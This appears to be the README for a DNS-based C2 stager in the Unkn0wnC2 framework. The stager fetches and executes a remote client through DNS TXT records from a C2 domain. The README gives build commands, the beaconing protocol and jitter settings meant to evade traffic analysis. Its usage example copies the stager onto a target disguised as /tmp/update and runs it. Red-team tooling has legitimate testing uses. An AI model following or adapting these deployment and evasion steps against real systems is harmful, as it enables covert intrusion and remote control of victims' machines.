# Unkn0wnC2 DNS Stager

A lightweight C stager that downloads and executes the full DNS C2 client via DNS TXT records.

## Overview

The stager is a small, standalone executable that:
1. Sends system information to the C2 server via DNS
2. Receives the full client binary in chunks through DNS TXT records
3. Decompresses and writes the client to disk
4. Executes the client

## Protocol Flow

```
1. Stager → Server:  base36(STG|<IP>|<OS>|<ARCH>)  [via DNS subdomain]
2. Server → Stager:  base36(META|<total_chunks>)   [via TXT record data]
3. Stager → Server:  base36(ACK|0)                 [via DNS subdomain]
4. Server → Stager:  base36(CHUNK|<base64_data>)   [via TXT record data]
5. Stager → Server:  base36(ACK|1)                 [via DNS subdomain]
6. Server → Stager:  base36(CHUNK|<base64_data>)   [via TXT record data]
   ... continues until all chunks received ...
7. Stager: Decodes base36 → Assembles base64 → Decodes → Decompresses → Writes → Executes
```

**Note:** Stager messages use Base36 encoding (not encryption) for DNS compatibility.
The chunked client data is base64 encoded, wrapped in base36 encoded CHUNK messages.

## Building

### Prerequisites

**Linux:**
- GCC compiler: `sudo apt-get install gcc`
- zlib development libraries: `sudo apt-get install zlib1g-dev`
- MinGW-w64 for Windows cross-compilation: `sudo apt-get install mingw-w64`

**From Project Root:**
```bash
./build.sh
```

This will automatically build the stagers along with the server and client.

**From Stager Directory:**
```bash
cd Stager
bash build.sh
```

**Using Makefile:**
```bash
cd Stager

# Build all variants
make all

# Build specific targets
make linux        # All Linux variants
make windows      # All Windows variants
make linux-x64    # Linux 64-bit only
make win-x64      # Windows 64-bit only

# Custom DNS server and domain
make DNS_SERVER=1.1.1.1 C2_DOMAIN=example.com
```

## Build Outputs

Built stagers are placed in `build/stager/`:

- `stager-linux-x64` - Linux 64-bit
- `stager-windows-x64.exe` - Windows 64-bit

## Deployment

1. Build the stager with appropriate DNS server and C2 domain
2. Deploy the stager to target system
3. Ensure the C2 server has the client binary in the `build/` directory
4. Execute the stager - it will download and run the full client

## Configuration

The stager is configured at compile time via `build_config.json`:

### Build-Time Configuration
- **DNS_SERVER**: DNS server to query (default: 8.8.8.8)
- **C2_DOMAIN**: C2 domain name (default: secwolf.net)

### Jitter and Timing Configuration
The stager uses randomized timing to avoid detection patterns:

- **jitter_min_ms**: Minimum delay between chunk requests (default: 100ms)
- **jitter_max_ms**: Maximum delay between chunk requests (default: 500ms)
- **chunks_per_burst**: Number of chunks before longer pause (default: 10)
- **burst_pause_ms**: Pause duration between bursts (default: 2000ms)
- **retry_delay_seconds**: Delay between retry attempts (default: 3s)
- **max_retries**: Maximum retry attempts for failed DNS queries (default: 5)

### Example Configuration
```json
{
  "stager": {
    "jitter_min_ms": 100,
    "jitter_max_ms": 500,
    "chunks_per_burst": 10,
    "burst_pause_ms": 2000,
    "retry_delay_seconds": 3,
    "max_retries": 5
  }
}
```

**Jitter Strategy:**
- Between each chunk: random delay of 100-500ms (prevents fixed timing patterns)
- Every 10 chunks: 2-second pause (burst control to avoid flooding DNS)
- Failed queries: 3-second delay before retry (allows DNS propagation)
- This irregular timing defeats network traffic analysis tools

All configuration values are embedded at compile time from `build_config.json`.

## Technical Details

### DNS Compatibility
- All communication uses standard DNS TXT queries
- Queries go through recursive resolvers (never directly to C2 server)
- Stager messages encoded with Base36 for DNS-safe transmission (no encryption)
- Base36 allows use of 0-9 and a-z characters in subdomains
- Adheres to DNS label limits (63 characters per label)
- TXT record data limited to 255 bytes per string
- Cache busting via timestamps

### Data Encoding
- **Stager queries**: Base36 encoded (STG|IP|OS|ARCH and ACK|N)
- **Server responses**: Base36 encoded (META|N and CHUNK|data)
- **Client data within chunks**: Base64 encoded, gzip compressed
- **Overall flow**: Message → Base36 → DNS query → TXT response → Base36 decode → Extract base64 client data
- Split into 200-byte chunks for safe DNS transmission

### Server Requirements
- Server must have client binary at:
  - `build/dns-client-windows.exe` for Windows targets
  - `build/dns-client-linux` for Linux targets

## Limitations

- **Windows stagers**: Skip decompression (server sends uncompressed base64)
- **Maximum size**: Practical limit ~1MB for client binary (depends on DNS infrastructure)
- **Network**: Requires outbound DNS (UDP port 53)

## Security Considerations

⚠️ **This is for authorized testing only**

- Stager messages use Base36 encoding but **NOT encryption** (for simplicity and size)
- Base36 provides DNS compatibility but not confidentiality
- Client binary data is base64 encoded within base36-wrapped CHUNK messages
- Stager binaries are not obfuscated
- Network traffic follows predictable DNS patterns
- Client binary written to disk in clear
- No authentication of server responses
- Designed for lab/testing environments

**Why no encryption for stager?**
- Keeps stager binary small (~30KB)
- Stager is meant to be disposable/ephemeral
- Client data chunks are still obscured via base64 within base36
- Full client uses AES-GCM encryption for actual C2 operations

## Troubleshooting

**Build errors:**
- Ensure all dependencies are installed
- Check GCC and cross-compiler versions
- Verify zlib development headers are available

**Runtime issues:**
- Verify DNS connectivity to configured DNS server
- Check C2 server has client binary in correct location
- Ensure C2 server is running and authoritative for domain
- Review server logs for stager connection attempts

**DNS resolution failures:**
- Test DNS resolution: `nslookup example.com <DNS_SERVER>`
- Verify no DNS filtering/blocking in network path
- Check firewall allows outbound UDP port 53

## Example Usage

```bash
# On attacker system (build)
cd Stager
make DNS_SERVER=8.8.8.8 C2_DOMAIN=secwolf.net linux-x64

# Transfer stager to target
scp stager-linux-x64 user@target:/tmp/update

# On target system (execute)
chmod +x /tmp/update
/tmp/update

# Stager will:
# 1. Contact C2 server via DNS
# 2. Download client binary
# 3. Execute client in background
# 4. Client begins normal C2 operations
```

## Development

### Adding New Platforms

Edit `getClientPath()` in `Server/c2_manager.go`:

```go
clientMap := map[string]string{
    "darwin/amd64": "build/dns-client-macos",
    // Add new platform mappings
}
```

### Adjusting Chunk Size

The chunk size is configured to 370 bytes for DNS-safe transmission within the 512-byte UDP limit.
This value is controlled by the Master server when building the stager. Only modify if you have 
specific DNS infrastructure requirements:

```c
#define CHUNK_SIZE 370  // DNS-safe for standard 512-byte UDP limit
```

**Note**: Chunk size must match across Master (`Master/api.go`, `Master/db.go`, `Master/builder.go`),
DNS Server (`Server/constants.go`), and Stager (`stager.c`). Smaller values increase reliability 
but require more DNS queries.

## License

Part of the Unkn0wnC2 framework. For authorized security testing only.
